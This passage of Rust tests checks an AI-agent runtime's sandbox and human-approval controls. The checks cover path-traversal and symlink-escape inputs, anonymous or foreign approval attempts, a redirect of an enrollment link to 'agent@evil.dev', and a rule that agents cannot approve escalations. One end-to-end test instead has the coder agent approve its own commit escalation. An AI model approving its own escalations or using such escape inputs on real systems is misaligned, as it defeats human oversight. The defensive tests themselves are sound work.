        assert!(env_txt.contains(&format!("npm_config_store_dir={}", expected_store.display())), "{env_txt}");
        assert!(!env.workspace.shadow_root().join(".pnpm-store").exists());
    }

    #[test]
    fn shadow_paths_reject_traversal() {
        let tmp = tempfile::tempdir().unwrap();
        let (shadow, host) = (tmp.path().join("shadow"), tmp.path().join("host"));
        std::fs::create_dir_all(&shadow).unwrap();
        std::fs::create_dir_all(&host).unwrap();
        for bad in ["../x", "a/../../x", "", "/", "./"] {
            assert!(shadow_path_for_write(&shadow, bad).is_err(), "{bad}");
            assert!(shadow_path_for_read(&shadow, &host, bad).is_err(), "{bad}");
        }
        // Repo-absolute paths and names merely containing ".." stay allowed.
        let (clean, full) = shadow_path_for_write(&shadow, "/src/a..b.rs").unwrap();
        assert_eq!(clean, "src/a..b.rs");
        assert_eq!(full, shadow.join("src/a..b.rs"));
    }

    #[tokio::test]
    async fn http_daemon_rejects_oversized_bodies() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        let addr = kernel.start_http_daemon("127.0.0.1:0", repo).await.unwrap();

        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let req = format!(
            "POST /mcp HTTP/1.1\r\nHost: {addr}\r\nContent-Length: {}\r\n\r\n{{",
            MAX_HTTP_BODY_BYTES + 1
        );
        stream.write_all(req.as_bytes()).await.unwrap();
        let mut resp = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut resp).await.unwrap();
        assert!(String::from_utf8_lossy(&resp).starts_with("HTTP/1.1 413"));
    }

    #[test]
    fn every_mcp_tool_declares_all_four_annotation_hints() {
        let schema = AegisRuntimeKernel::mcp_tools_schema();
        let tools = schema["tools"].as_array().unwrap();
        let names: Vec<&str> = tools.iter().map(|t| t["name"].as_str().unwrap()).collect();
        for tool in tools {
            for hint in ["readOnlyHint", "destructiveHint", "idempotentHint", "openWorldHint"] {
                assert!(
                    tool["annotations"][hint].is_boolean(),
                    "{} lacks a boolean {hint}",
                    tool["name"]
                );
            }
            if tool["annotations"]["readOnlyHint"] == true {
                assert_eq!(tool["annotations"]["destructiveHint"], false, "{}", tool["name"]);
            }
        }
        for (name, ..) in TOOL_ANNOTATIONS {
            assert!(names.contains(name), "annotation for unknown tool {name}");
        }
    }

    #[tokio::test]
    async fn gateway_tool_profile_slims_schema_without_breaking_annotations() {
        let minimal = AegisRuntimeKernel::mcp_tools_schema_for_profile(GatewayToolProfile::Minimal);
        let collab = AegisRuntimeKernel::mcp_tools_schema_for_profile(GatewayToolProfile::Collab);
        let standard =
            AegisRuntimeKernel::mcp_tools_schema_for_profile(GatewayToolProfile::Standard);

        let min_names: Vec<&str> = minimal["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        let col_names: Vec<&str> = collab["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        let std_names: Vec<&str> = standard["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();

        assert_eq!(min_names.len(), 10);
        assert!(min_names.contains(&"policy_list_escalations"));
        assert!(min_names.contains(&"workspace_commit"));
        assert_eq!(col_names.len(), 27);
        assert_eq!(std_names.len(), 55);
        assert!(std_names.contains(&"mcp_list_installed"));
        assert!(std_names.contains(&"mcp_discover"));
        assert!(std_names.contains(&"mcp_request_install"));
        assert!(std_names.contains(&"mcp_hot_list_tools"));
        assert!(std_names.contains(&"mcp_hot_call_tool"));
        assert!(!std_names.contains(&"app_catalog_search"));
        assert!(!std_names.contains(&"app_mount_session"));
        assert!(!std_names.contains(&"app_call_tool"));

        // Default runtime `tools/list` advertises Standard profile (no deprecated app_* tools or catalog resource).
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-1", "Engineer");
        let list = kernel
            .handle_jsonrpc_message(&agent, json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" }))
            .await
            .unwrap();
        let live_names: Vec<&str> = list["result"]["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        assert!(!live_names.contains(&"app_call_tool"));
        assert!(live_names.contains(&"policy_list_escalations"));
        assert!(kernel.call_tool(&agent, "app_call_tool", json!({})).await.is_err());

        let res_list = kernel
            .handle_jsonrpc_message(&agent, json!({ "jsonrpc": "2.0", "id": 2, "method": "resources/list" }))
            .await
            .unwrap();
        let res_uris: Vec<&str> = res_list["result"]["resources"]
            .as_array()
            .unwrap()
            .iter()
            .map(|r| r["uri"].as_str().unwrap())
            .collect();
        assert!(!res_uris.contains(&"aegis://apps/catalog"));
        assert!(res_uris.contains(&"aegis://mcp/installed"));
    }

    async fn raw_http(addr: std::net::SocketAddr, method: &str, path: &str, auth: Option<&str>, body: Option<Value>) -> (String, Value) {
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let body_str = body.map(|b| b.to_string()).unwrap_or_default();
        let auth_hdr = auth.map(|a| format!("Authorization: Bearer {a}\r\n")).unwrap_or_default();
        let req = format!(
            "{method} {path} HTTP/1.1\r\nHost: {addr}\r\n{auth_hdr}Content-Length: {}\r\n\r\n{body_str}",
            body_str.len()
        );
        stream.write_all(req.as_bytes()).await.unwrap();
        let mut buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf).await.unwrap();
        let raw = String::from_utf8_lossy(&buf).to_string();
        let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
        let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "html": b }));
        (head.to_string(), parsed)
    }

    fn code_for(secret_b32: &str, step_offset: i64) -> String {
        // Decode RFC 4648 base32 (test-only; the server stores raw bytes).
        let mut bits = 0u32;
        let mut buf = 0u32;
        let mut bytes = Vec::new();
        for c in secret_b32.bytes() {
            let v = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".iter().position(|x| *x == c).unwrap() as u32;
            buf = (buf << 5) | v;
            bits += 5;
            if bits >= 8 {
                bytes.push((buf >> (bits - 8)) as u8);
                bits -= 8;
            }
        }
        let step = approver::totp_step(chrono::Utc::now().timestamp()) + step_offset;
        format!("{:06}", approver::hotp(&bytes, step as u64))
    }

    #[tokio::test]
    async fn loopback_console_rejects_anonymous_approvals_without_an_enrolled_approver() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        assert!(addr.ip().is_loopback());
        let op = kernel.operator_token();
        let (_, v) = raw_http(addr, "POST", "/v1/approvals/simulate", Some(&op), Some(json!({ "org_id": "solo", "agent_id": "coder" }))).await;
        let esc = v["escalation_id"].as_str().unwrap().to_string();

        // Any local process can reach the loopback port; without the operator credential it must
        // not be able to approve, even though org `solo` has no TOTP approver enrolled.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", None, Some(json!({ "escalation_id": esc, "ttl_secs": 86400 }))).await;
        assert!(head.contains("403"), "anonymous loopback approval must be rejected: {head}");
        let still_pending = kernel
            .policy
            .list_escalations("solo")
            .await
            .unwrap()
            .into_iter()
            .any(|e| e.escalation_id == esc && e.status == aos_core::EscalationStatus::Pending);
        assert!(still_pending, "escalation must remain pending after the rejected attempt");

        // The human's browser (operator credential from the URL fragment) can still decide.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&op), Some(json!({ "escalation_id": esc }))).await;
        assert!(head.contains("200"), "operator approval must succeed: {head}");
    }

    #[tokio::test]
    async fn tenant_approver_enrolls_by_email_and_approves_with_totp() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let outbox = temp.path().join("outbox");
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        kernel.paas.set_mailer(approver::Mailer::Directory(outbox.clone()), "https://cloud.example/aegis-cloud");
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let (acme_key, _) = kernel.paas.issue_api_key("acme", "coder", "Engineer", None, "test").await.unwrap();
        let (other_key, _) = kernel.paas.issue_api_key("other", "coder", "Engineer", None, "test").await.unwrap();

        let simulate = |org: &'static str| {
            let op = op.clone();
            async move {
                let (_, v) = raw_http(addr, "POST", "/v1/approvals/simulate", Some(&op), Some(json!({ "org_id": org, "agent_id": "coder" }))).await;
                v["escalation_id"].as_str().unwrap().to_string()
            }
        };
        let esc1 = simulate("acme").await;

        // Without an approver, a tenant key cannot approve, code or not.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1 }))).await;
        assert!(head.contains("403"), "{head}");
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": "123456" }))).await;
        assert!(head.contains("403"), "{head}");

        // Enrollment is mailed; the API response never contains the link or secret.
        let (head, resp) = raw_http(addr, "POST", "/v1/approver/email", Some(&acme_key), Some(json!({ "email": "Lead@Acme.dev" }))).await;
        assert!(head.contains("200 OK"), "{head} {resp}");
        assert!(!resp.to_string().contains("aet_"));
        let mail = std::fs::read_dir(&outbox).unwrap().next().unwrap().unwrap().path();
        let mail = std::fs::read_to_string(mail).unwrap();
        assert!(mail.starts_with("To: lead@acme.dev"));
        let token = mail.split("token=").nth(1).unwrap().split_whitespace().next().unwrap().to_string();
        assert!(mail.contains("https://cloud.example/aegis-cloud/approver/enroll?token="));

        // Opening the link changes nothing; pressing the button issues the secret exactly once.
        let (head, page) = raw_http(addr, "GET", &format!("/approver/enroll?token={token}"), None, None).await;
        assert!(head.contains("200 OK") && page["html"].as_str().unwrap().contains("Enroll my authenticator"));
        assert_eq!(kernel.paas.approver_status("acme").await["enrolled"], false);
        let (head, enrolled) = raw_http(addr, "POST", "/approver/enroll", None, Some(json!({ "token": token }))).await;
        assert!(head.contains("200 OK"), "{head} {enrolled}");
        assert_eq!(enrolled["org_id"], "acme");
        assert!(enrolled["qr_svg"].as_str().unwrap().contains("<svg"));
        let secret = enrolled["secret"].as_str().unwrap().to_string();
        let (head, _) = raw_http(addr, "POST", "/approver/enroll", None, Some(json!({ "token": token }))).await;
        assert!(head.contains("400"), "{head}");
        let (_, status) = raw_http(addr, "GET", "/v1/approver", Some(&acme_key), None).await;
        assert_eq!(status["enrolled"], true);
        assert_eq!(status["email"], "l***@acme.dev");

        // Later links can only go to the bound address.
        let (head, _) = raw_http(addr, "POST", "/v1/approver/email", Some(&acme_key), Some(json!({ "email": "agent@evil.dev" }))).await;
        assert!(head.contains("400"), "{head}");

        // Wrong code is refused; the right code approves with a bounded lease.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": "000000" }))).await;
        assert!(head.contains("403"), "{head}");
        let code = code_for(&secret, 0);
        let (head, resp) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": code, "ttl_secs": 0 }))).await;
        assert!(head.contains("200 OK"), "{head} {resp}");
        assert_eq!(resp["status"], "approved");
        assert!(resp["lease"]["expires_at_ms"].as_i64().unwrap() > 0, "tenant leases are never permanent: {resp}");

        // A used code cannot be replayed, and another org's escalation is out of reach.
        let esc2 = simulate("acme").await;
        let (head, resp) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc2, "totp": code }))).await;
        assert!(head.contains("403") && resp["error"].as_str().unwrap().contains("already used"), "{head} {resp}");
        let foreign = simulate("other").await;
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": foreign, "totp": code_for(&secret, 1) }))).await;
        assert!(head.contains("403"), "{head}");
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&other_key), Some(json!({ "escalation_id": esc2, "totp": code_for(&secret, 1) }))).await;
        assert!(head.contains("403"), "{head}");

        // Tenants cannot reset approvers; the operator can.
        let (head, _) = raw_http(addr, "DELETE", "/v1/approver", Some(&acme_key), None).await;
        assert!(head.contains("403"), "{head}");
        let (head, resp) = raw_http(addr, "DELETE", "/v1/approver?org_id=acme", Some(&op), None).await;
        assert!(head.contains("200 OK") && resp["removed"] == true, "{head} {resp}");

        // Only the operator can delete an org; afterwards its keys no longer authenticate.
        let (head, _) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&acme_key), None).await;
        assert!(head.contains("403"), "{head}");
        let (head, resp) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&op), None).await;
        assert!(head.contains("200 OK") && resp["status"] == "deleted", "{head} {resp}");
        assert_eq!(resp["removed"]["api_keys"], 1, "{resp}");
        let (head, _) = raw_http(addr, "GET", "/v1/approver", Some(&acme_key), None).await;
        assert!(head.contains("401"), "{head}");
        let (_, resp) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&op), None).await;
        assert_eq!(resp["status"], "not_found", "{resp}");
        let (head, _) = raw_http(addr, "DELETE", "/v1/orgs?org_id=*", Some(&op), None).await;
        assert!(head.contains("400"), "{head}");
    }

    #[tokio::test]
    async fn approver_lockout_after_repeated_wrong_codes() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        kernel.paas.set_mailer(approver::Mailer::Directory(temp.path().join("outbox")), "https://x.example");
        kernel.paas.request_approver_email_enrollment("acme", "a@acme.dev").await.unwrap();
        let mail = std::fs::read_dir(temp.path().join("outbox")).unwrap().next().unwrap().unwrap().path();
        let token = std::fs::read_to_string(mail).unwrap().split("token=").nth(1).unwrap().split_whitespace().next().unwrap().to_string();
        let enrolled = kernel.paas.confirm_approver_email_enrollment(&token).await.unwrap();
        let secret = enrolled["secret"].as_str().unwrap().to_string();
        for _ in 0..5 {
            assert!(kernel.paas.verify_approver_code("acme", "000000").await.is_err());
        }
        let err = kernel.paas.verify_approver_code("acme", &code_for(&secret, 0)).await.unwrap_err();
        assert!(err.to_string().contains("locked"), "{err}");
    }

    #[tokio::test]
    async fn memory_policy_evaluate_asks_then_allows_after_approval() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt"))
            .await
            .unwrap();
        let agent = AgentIdentity::new("local", "claude-desktop", "Memory Reader");

        let call = |id: u64, resource: &str| {
            json!({
                "jsonrpc": "2.0",
                "id": id,
                "method": "tools/call",
                "params": {
                    "name": "memory_policy_evaluate",
                    "arguments": { "action": "read", "resource": resource }
                }
            })
        };

        let resp = kernel
            .handle_jsonrpc_message(&agent, call(1, "memory:tag:notes/projects"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "ask");
        let escalation_id = payload["escalation_id"]
            .as_str()
            .expect("escalation id")
            .to_string();

        kernel
            .policy
            .approve_escalation(&escalation_id, 1800, "user")
            .await
            .unwrap();

        let resp = kernel
            .handle_jsonrpc_message(&agent, call(2, "memory:tag:notes/projects"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "allow");

        // A tag lease must not authorize a different tag.
        let resp = kernel
            .handle_jsonrpc_message(&agent, call(3, "memory:tag:notes/journal"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "ask");
    }

    #[tokio::test]
    async fn agents_cannot_grant_leases_or_approve_escalations_over_mcp() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-1", "Engineer");

        let list = kernel
            .handle_jsonrpc_message(&agent, json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" }))
            .await
            .unwrap();
        let names: Vec<&str> = list["result"]["tools"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"policy_list_escalations"));
        for tool in HUMAN_ONLY_TOOLS {
            assert!(!names.contains(tool), "{tool} must not be advertised to agents");
            let resp = kernel
                .handle_jsonrpc_message(
                    &agent,
                    json!({
                        "jsonrpc": "2.0",
                        "id": 2,
                        "method": "tools/call",
                        "params": { "name": tool, "arguments": { "escalation_id": "esc-x", "action_pattern": "*" } }
                    }),
                )
                .await
                .unwrap();
            assert_eq!(resp["result"]["isError"], true, "{tool}");
            assert!(resp["result"]["content"][0]["text"]
                .as_str()
                .unwrap()
                .contains("reserved for the human operator"));
        }
        let leases = kernel.policy.list_leases("acme", None).await.unwrap();
        assert!(leases.is_empty(), "no lease may be minted via MCP");
    }

    #[cfg(unix)]
    #[test]
    fn shadow_paths_refuse_symlink_escapes() {
        use std::os::unix::fs::symlink;
        let tmp = tempfile::tempdir().unwrap();
        let (shadow, host, outside) = (
            tmp.path().join("shadow"),
            tmp.path().join("host"),
            tmp.path().join("outside"),
        );
        for d in [&shadow, &host, &outside] {
            std::fs::create_dir_all(d).unwrap();
        }
        std::fs::write(outside.join("secret"), "s").unwrap();
        std::fs::write(host.join("dep.js"), "d").unwrap();
        symlink(outside.join("secret"), shadow.join("rc")).unwrap();
        symlink(&outside, shadow.join("out")).unwrap();
        symlink(&host, shadow.join("node_modules")).unwrap();

        // Writes never go through a symlink, whether it is the leaf or a parent directory.
        assert!(shadow_path_for_write(&shadow, "rc").is_err());
        assert!(shadow_path_for_write(&shadow, "out/new.txt").is_err());
        assert!(shadow_path_for_write(&shadow, "node_modules/dep.js").is_err());
        assert!(shadow_path_for_write(&shadow, "fresh/dir/file.txt").is_ok());

        // Reads may follow links into the host repo, never elsewhere.
        assert!(shadow_path_for_read(&shadow, &host, "rc").is_err());
        assert!(shadow_path_for_read(&shadow, &host, "out/secret").is_err());
        assert!(shadow_path_for_read(&shadow, &host, "node_modules/dep.js").is_ok());
    }

    #[tokio::test]
    async fn test_end_to_end_multi_agent_ipc_and_cow_workflow() {
        let temp = tempfile::tempdir().unwrap();
        let host_project = temp.path().join("host_repo");
        let runtime_root = temp.path().join("aegis_runtime");

        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("lib.rs"), "pub fn version() -> u32 { 1 }\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&runtime_root).await.unwrap();

        let researcher = AgentIdentity::new("acme", "researcher-1", "Security Researcher")
            .with_capabilities(vec!["audit".to_string()]);
        let coder = AgentIdentity::new("acme", "coder-1", "Rust Engineer")
            .with_capabilities(vec!["code".to_string(), "test".to_string()]);

        kernel
            .ensure_agent_environment(
                researcher.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["releases".to_string()],
            )
            .await
            .unwrap();

        kernel
            .ensure_agent_environment(
                coder.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["tasks".to_string()],
            )
            .await
            .unwrap();

        let pub_res = kernel
            .call_tool(
                &researcher,
                "org_artifact_publish",
                json!({
                    "name": "upgrade_spec.json",
                    "content": "{\"target_version\": 2}",
                    "content_type": "application/json"
                }),
            )
            .await
            .unwrap();
        let artifact_uri = pub_res.get("uri").unwrap().as_str().unwrap().to_string();

        let req_res = kernel
            .call_tool(
                &researcher,
                "ipc_request",
                json!({
                    "to_agent": "coder-1",
                    "subject": "Bump library version to 2",
                    "payload": { "instructions": "Follow attached spec" },
                    "attachments": [artifact_uri]
                }),
            )
            .await
            .unwrap();
        let req_msg_id = req_res.get("msg_id").unwrap().as_str().unwrap().to_string();

        let inbox_res = kernel
            .call_tool(&coder, "ipc_recv", json!({ "unread_only": true }))
            .await
            .unwrap();
        assert_eq!(inbox_res["messages_count"], 1);

        // Surgical edit via `fs_edit` inside CoW workspace
        kernel
            .call_tool(
                &coder,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn version() -> u32 { 1 }",
                    "replacement": "pub fn version() -> u32 { 2 }"
                }),
            )
            .await
            .unwrap();

        let researcher_read = kernel
            .call_tool(&researcher, "fs_read", json!({ "path": "lib.rs" }))
            .await
            .unwrap();
        assert_eq!(
            researcher_read["content"].as_str().unwrap(),
            "pub fn version() -> u32 { 1 }\n"
        );

        let commit_attempt = kernel
            .call_tool(&coder, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_attempt["status"], "approval_required");
        let esc_id = commit_attempt["escalation_id"].as_str().unwrap().to_string();

        // Approve the escalation directly via `policy_approve_escalation`
        kernel
            .call_tool(
                &coder,
                "policy_approve_escalation",
                json!({ "escalation_id": esc_id, "ttl_secs": 3600 }),
            )
            .await
            .unwrap();

        let commit_ok = kernel
            .call_tool(&coder, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_ok["status"], "committed_to_host");

        kernel
            .call_tool(
                &coder,
                "ipc_reply",
                json!({
                    "msg_id": req_msg_id,
                    "success": true,
                    "payload": { "committed_files": ["lib.rs"] }
                }),
            )
            .await
            .unwrap();

        let researcher_inbox = kernel
            .call_tool(&researcher, "ipc_recv", json!({ "unread_only": true }))
            .await
            .unwrap();
        assert_eq!(researcher_inbox["messages_count"], 1);
    }

    #[tokio::test]
    async fn test_http_daemon_and_jsonrpc_handler() {
        let temp = tempfile::tempdir().unwrap();
        let host_project = temp.path().join("host_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("main.rs"), "fn main() {}\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", host_project)
            .await
            .unwrap();
        let op = kernel.operator_token();
        assert!(op.starts_with("aop_"), "an operator token is generated when none is configured");

        // Identity headers alone carry no authority: anonymous /mcp is rejected.
        let mut anon = tokio::net::TcpStream::connect(addr).await.unwrap();
        anon.write_all(
            format!("POST /mcp HTTP/1.1\r\nHost: {addr}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: 2\r\n\r\n{{}}").as_bytes(),
        )
        .await
        .unwrap();
        let mut anon_resp = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut anon, &mut anon_resp).await.unwrap();
        assert!(String::from_utf8_lossy(&anon_resp).starts_with("HTTP/1.1 401"));

        // Connect over TCP and send a POST /mcp JSON-RPC initialize request
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let rpc_body = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize"
        })
        .to_string();
        let http_req = format!(
            "POST /mcp HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer {}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: {}\r\n\r\n{}",
            addr,
            op,
            rpc_body.len(),
            rpc_body
        );
        stream.write_all(http_req.as_bytes()).await.unwrap();

        let mut resp_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut resp_buf)
            .await
            .unwrap();
        let resp_str = String::from_utf8_lossy(&resp_buf);
        assert!(resp_str.contains("200 OK"));
        assert!(resp_str.contains("aegis-os-runtime"));

        // Verify Google A2A discovery endpoint `GET /.well-known/agent.json`
        let mut a2a_stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let card_req = format!(
            "GET /.well-known/agent.json HTTP/1.1\r\nHost: {}\r\n\r\n",
            addr
        );
        a2a_stream.write_all(card_req.as_bytes()).await.unwrap();
        let mut card_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut a2a_stream, &mut card_buf)
            .await
            .unwrap();
        let card_str = String::from_utf8_lossy(&card_buf);
        assert!(card_str.contains("200 OK"));
        assert!(card_str.contains("aegis-os-workstation-gateway"));
        assert!(card_str.contains("acme/agy-agent"));

        // Verify Google A2A `POST /a2a` `tasks/send` & `tasks/get`
        let mut task_stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let send_body = json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tasks/send",
            "params": {
                "to_agent": "acme/agy-agent",
                "subject": "Verify A2A endpoint",
                "payload": { "context_id": "ctx-http-a2a" }
            }
        })
        .to_string();
        let send_req = format!(
            "POST /a2a HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer {}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: {}\r\n\r\n{}",
            addr,
            op,
            send_body.len(),
            send_body
        );
        task_stream.write_all(send_req.as_bytes()).await.unwrap();
        let mut send_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut task_stream, &mut send_buf)
            .await
            .unwrap();
        let send_str = String::from_utf8_lossy(&send_buf);
        assert!(send_str.contains("200 OK"));
        assert!(send_str.contains("\"state\":\"submitted\""));
        assert!(send_str.contains("ctx-http-a2a"));
    }

    #[tokio::test]
    async fn a2a_cancel_revokes_memory_sessions_end_to_end() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let mut kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();

        let memory_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let memory_addr = memory_listener.local_addr().unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            let (mut socket, _) = memory_listener.accept().await.unwrap();
            let request = read_full_http_request(&mut socket).await;
            assert!(request.contains("POST /v1/sessions/revoke-by-task"));
            assert!(request.to_lowercase().contains("x-aegis-task-token: msg-"));
            let body = r#"{"status":"revoked","count":1}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            tokio::io::AsyncWriteExt::write_all(&mut socket, response.as_bytes())
                .await
                .unwrap();
            tokio::io::AsyncWriteExt::flush(&mut socket).await.unwrap();
            let _ = tokio::io::AsyncWriteExt::shutdown(&mut socket).await;
            let _ = tx.send(());
        });
        kernel.memory_url = Some(format!("http://{memory_addr}"));
        kernel.memory_task_secret = Some("test-secret".to_string());
        kernel.memory_bridge_token = None;

        let task = kernel
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: "acme".to_string(),
                from_agent: "acme/planner".to_string(),
                to_target: "worker".to_string(),
                kind: IpcKind::TaskRequest {
                    timeout_secs: Some(60),
                },
                subject: "e2e cancel".to_string(),
                payload: json!({}),
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await
            .unwrap();
        // Use a stable task id for the mock assertion.
        let task_id = task.msg_id;
        let kernel = Arc::new(kernel);
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", repo)
            .await
            .unwrap();
        let op = kernel.operator_token();
        let body = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tasks/cancel",
            "params": { "id": task_id }
        })
        .to_string();
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let request = format!(
            "POST /v1/a2a HTTP/1.1\r\nHost: {addr}\r\nAuthorization: Bearer {op}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: planner\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );
        tokio::io::AsyncWriteExt::write_all(&mut stream, request.as_bytes())
            .await
            .unwrap();
        let mut response = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut response)
            .await
            .unwrap();
        let response = String::from_utf8_lossy(&response);
        assert!(response.contains("200 OK"), "{response}");
        assert!(response.contains("\"state\":\"canceled\""), "{response}");
        tokio::time::timeout(std::time::Duration::from_secs(5), rx)
            .await
            .unwrap()
            .unwrap();
    }

    #[tokio::test]
    async fn terminal_task_sends_task_scoped_memory_revoke() {
        let temp = tempfile::tempdir().unwrap();
        let mut kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let request = read_full_http_request(&mut socket).await;
            assert!(request.contains("POST /v1/sessions/revoke-by-task"));
            assert!(request.to_lowercase().contains("x-aegis-task-token: task-1:"));
            let body = r#"{"status":"revoked","count":1}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            tokio::io::AsyncWriteExt::write_all(&mut socket, response.as_bytes())
                .await
                .unwrap();
            tokio::io::AsyncWriteExt::flush(&mut socket).await.unwrap();
            let _ = tokio::io::AsyncWriteExt::shutdown(&mut socket).await;
            let _ = tx.send(());
        });
        kernel.memory_url = Some(format!("http://{addr}"));
        kernel.memory_task_secret = Some("test-secret".to_string());
        kernel.memory_bridge_token = None;
